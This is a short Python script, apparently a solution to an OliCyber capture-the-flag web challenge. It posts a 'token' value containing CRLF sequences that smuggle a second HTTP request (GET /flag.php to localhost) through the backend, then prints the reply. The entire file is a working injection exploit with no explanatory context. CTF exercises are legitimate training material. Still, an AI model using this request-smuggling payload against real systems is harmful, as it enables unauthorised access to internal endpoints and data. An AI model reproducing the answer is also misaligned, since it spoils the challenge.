import requests 

url = "http://the-backend.challs.olicyber.it/"

data = {
    "token": b"AAAA\r\nConnection: keep-alive\r\n\r\nGET /flag.php HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n"
}

r = requests.post("http://the-backend.challs.olicyber.it/", data=data)
print(r.text)